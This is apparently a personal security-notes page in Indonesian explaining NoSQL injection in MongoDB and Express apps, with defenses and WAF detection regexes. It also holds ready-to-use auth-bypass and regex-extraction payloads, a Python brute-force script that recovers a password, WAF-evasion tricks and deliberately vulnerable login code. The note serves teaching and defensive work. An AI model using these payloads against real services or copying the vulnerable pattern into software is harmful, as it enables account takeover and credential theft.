---
title: "NoSQL Injection — Deep Dive: MongoDB, Express, Attack Vectors, Detection & Defense"
tags:
  - cyber-security
  - nosql
  - injection
  - web-security
  - database
  - library
aliases:
  - "NoSQL Injection Complete Guide"
  - "MongoDB Injection Techniques"
created: "2026-07-28"
updated: "2026-07-28"
status: pending
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> NoSQL Injection adalah kerentanan yang terjadi ketika input user tidak divalidasi dengan benar pada query database NoSQL (MongoDB, Cassandra, Couchbase, Redis). Berbeda dengan SQL injection yang memanipulasi query SQL terstruktur, NoSQL injection memanfaatkan operator query (seperti `$ne`, `$gt`, `$regex`, `$where`) dan struktur JSON untuk bypass autentikasi, ekstraksi data, atau bahkan RCE. Catatan ini mencakup attack vectors, payload per database, teknik bypass WAF, dan strategi defense.

**Cross-link:** [[database-security-sql-nosql-injection-defense]] → [[api-security-deep-dive]] → [[web-hacking-exploitation]] → [[web-security]]

---

## Daftar Isi
- [[#1. Mengapa NoSQL Injection Berbeda]]
- [[#2. MongoDB Injection — Operator Exploitation]]
- [[#3. Express.js & Node.js NoSQL Injection]]
- [[#4. NoSQL Injection via REST API]]
- [[#5. Blind NoSQL Injection]]
- [[#6. NoSQL Injection di Database Lain]]
- [[#7. WAF Bypass Techniques]]
- [[#8. Defense Strategy]]
- [[#9. Detection Rules untuk jarsWAF]]
- [[#10. Referensi & Payload Database]]

---

## 1. Mengapa NoSQL Injection Berbeda

SQL injection mengeksploitasi structured query language. NoSQL injection mengeksploitasi **query operator** dan **type coercion** di database non-relasional.

### Perbedaan Fundamental

| Aspek | SQL Injection | NoSQL Injection |
|---|---|---|
| Query format | String concatenation | JSON/BSON document + operators |
| Bypass auth | `' OR '1'='1` | `{ "$ne": "" }` atau `{ "$gt": "" }` |
| Blind extraction | `SUBSTRING`, `SLEEP` | `$regex`, `$where` timing |
| Operator injection | `UNION`, `OR`, `AND` | `$ne`, `$gt`, `$regex`, `$where` |
| Attack surface | Web params + headers | JSON body + URL params + headers |
| Tool | sqlmap | NoSQLMap, custom scripts |

### Vektor Utama

```
HTTP Body: {"username": "admin", "password": {"$ne": ""}}
          → Query: db.users.findOne({username: "admin", password: {$ne: ""}})
          → Bypass: password tidak sama dengan string kosong → true
```

---

## 2. MongoDB Injection — Operator Exploitation

### Operator Reference

| Operator | Fungsi | Contoh Injection |
|---|---|---|
| `$ne` | Not equal | `{"$ne": ""}` → match semua |
| `$gt` | Greater than | `{"$gt": ""}` → match semua string |
| `$regex` | Regex match | `{"$regex": "^a"}` → blind extraction |
| `$nin` | Not in | `{"$nin": ["admin"]}` → exclude specific |
| `$where` | JS expression | `{"$where": "sleep(5000)"}` → timing attack |
| `$exists` | Field exists | `{"$exists": true}` |
| `$eq` | Equal | `{"$eq": "admin"}` |

### Auth Bypass Payloads

```json
// Login bypass — match semua user
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Bypass dengan $gt
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// Bypass dengan $nin
{"username": {"$nin": [""]}, "password": {"$nin": [""]}}

// Conditional bypass — if user == admin
{"username": "admin", "password": {"$ne": ""}}
```

### Data Extraction via $regex

```javascript
// Blind: cek apakah password dimulai dengan 'a'
POST /api/users/search
{"username": "admin", "password": {"$regex": "^a"}}

// Iterasi karakter via $regex + timing
{"$where": "this.password.startsWith('a') ? sleep(1000) : 1"}
// Kalau response lambat → huruf pertama 'a'
```

### Time-Based via $where

```javascript
// MongoDB $where menjalankan JavaScript
{"$where": "sleep(5000)"}  // Jika sleep function tersedia
// Atau via loop:
{"$where": "var d = new Date(); while(new Date() - d < 5000){}; return true"}
```

---

## 3. Express.js & Node.js NoSQL Injection

### Vulnerable Pattern

```javascript
// ❌ Vulnerable: langsung passing req.body ke query
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne({
    username: req.body.username,
    password: req.body.password
  });
  // Jika req.body = {username: "admin", password: {"$ne": ""}}
  // → query: {username: "admin", password: {$ne: ""}} → bypass!
});

// ❌ Vulnerable: URL params tanpa sanitasi
app.get("/user/:id", async (req, res) => {
  const user = await db.collection("users").findOne({
    _id: req.params.id  // bisa di-inject operator
  });
});
```

### URL Parameter Injection

```javascript
// GET /api/user?name[$ne]=admin
// Express parse: {name: {"$ne": "admin"}}
// → db.users.find({name: {"$ne": "admin"}})
```

### Safe Pattern

```javascript
// ✅ Safe: validate + sanitize tipe data
const safeQuery = {};
if (typeof req.body.username === 'string') {
  safeQuery.username = req.body.username;
}
if (typeof req.body.password === 'string') {
  safeQuery.password = req.body.password;
}
const user = await db.collection("users").findOne(safeQuery);
```

---

## 4. NoSQL Injection via REST API

### REST API Vectors

```bash
# Query string
GET /api/users?role[$gt]=

# JSON body — content-type application/json
POST /api/login
{"username": "admin", "password": {"$regex": ".*"}}

# Form urlencoded — content-type application/x-www-form-urlencoded
POST /api/login
username=admin&password[$ne]=

# Headers
Authorization: Bearer token[$regex]=.*
```

---

## 5. Blind NoSQL Injection

### Teknik Blind Extraction

```bash
# Step 1: Konfirmasi vulnerable
POST /api/login
{"username": "admin", "password": {"$ne": ""}}
# Response: 200 OK (login success)

# Step 2: Cek panjang password
POST /api/login
{"username": "admin", "password": {"$regex": ".{8}"}}
# Response: 200 → password ≥ 8 chars

# Step 3: Blind extract per karakter
POST /api/login
{"username": "admin", "password": {"$regex": "^a"}}
# Response 200 → huruf pertama 'a'
# Iterasi charset: [a-z0-9A-Z]
```

### Automation Script

```python
import requests
import string

url = "http://target.com/api/login"
chars = string.ascii_lowercase + string.digits
password = ""

for pos in range(20):  # max 20 chars
    for c in chars:
        payload = {"username": "admin",
                   "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            password += c
            print(f"[+] Found: {password}")
            break
    else:
        break  # no more chars
```

---

## 6. NoSQL Injection di Database Lain

### Redis

```bash
# Redis via EVAL/EVALSHA
EVAL "return redis.call('GET', KEYS[1])" 1 key

# NoSQL injection di Redis via application
# Biasanya melalui key injection
```

### Cassandra (CQL)

```sql
-- Cassandra menggunakan CQL (mirip SQL tapi NoSQL)
-- Injection via WHERE clause
SELECT * FROM users WHERE username = 'admin' AND password = '' ALLOW FILTERING;
```

### Couchbase (N1QL)

```sql
-- Couchbase N1QL injection
SELECT * FROM bucket WHERE username = "admin" AND password = "" OR 1=1
```

---

## 7. WAF Bypass Techniques

### Encoding JSON Operators

```json
// Obfuscated $ operators
{"username": "admin", "password": {"\u0024ne": ""}}
// \u0024 = $ → {"$ne": ""}

// Unicode normalization bypass
{"username": "admin", "password": {"﹩ne": ""}}
// ﹩ (U+FE69) vs $ (U+0024)
```

### Nested Object Bypass

```json
// Instead of $ne directly
{"username": "admin", "password": {"$gt": ""}}
// Try nested
{"username": "admin", "password[ne]": ""}
```

### Content-Type Switching

```bash
# WAF mungkin hanya cek application/json
# Coba urlencoded dengan parameter array
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=
```

---

## 8. Defense Strategy

| Defense | Implementasi | Efektivitas |
|---|---|---|
| **Type validation** | `typeof req.body.x === 'string'` sebelum query | Sangat tinggi |
| **Input sanitization** | Remove `$`, `{`, `}` dari input | Tinggi |
| **ORM/ODM layer** | Mongoose, TypeORM — schema-based | Sangat tinggi |
| **Parameterized query** | NoSQL query builder dengan escaping | Tinggi |
| **Least privilege** | Database user hanya punya akses minimal | Sedang |
| **WAF rule** | Block `$ne`, `$gt`, `$regex`, `$where` di body | Sedang (bisa bypass) |

### Mongoose (ODM) — Safe by Default

```javascript
// Mongoose secara default strip $ operators
const UserSchema = new mongoose.Schema({
  username: String,
  password: String
});
// req.body = {username: "admin", password: {"$ne": ""}}
// → Mongoose strips $ne → query safe
```

---

## 9. Detection Rules untuk jarsWAF

```rust
// Potensi implementasi di src/rules/nosql.rs
// Deteksi operator object injection
static NOSQL_OPERATOR: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""\$(ne|gt|lt|gte|lte|regex|nin|exists|where|eq|in|all|mod|slice|elemMatch)"\s*:"#).unwrap()
});

// Deteksi $where dengan timing function
static NOSQL_WHERE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)"\$where"\s*:\s*".*(sleep|setTimeout|Date\(\)|while\s*\()"#).unwrap()
});

// Deteksi object operator di URL params
static NOSQL_URL_PARAM: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\[\$(ne|gt|lt|regex|where|exists)\]"#).unwrap()
});
```

---

## 10. Referensi & Payload Database

Lokasi payload langsung:
```
/mnt/data_d/Projects/Reference/PayloadsAllTheThings/NoSQL Injection/
```

Berisi:
- `README.md` — dokumentasi lengkap + payload
- `Intruder/` — file untuk Burp Intruder
- `README-ko.md` — dokumentasi bahasa Korea

**Cross-link vault:**
- [[database-security-sql-nosql-injection-defense]] — defense umum database
- [[api-security-deep-dive]] — API security
- [[web-hacking-exploitation]] — teknik eksploitasi
- [[waf-reverse-proxy-deepdive]] — WAF architecture
- [[ctf-tool-arsenal-universal]] — tool arsenal
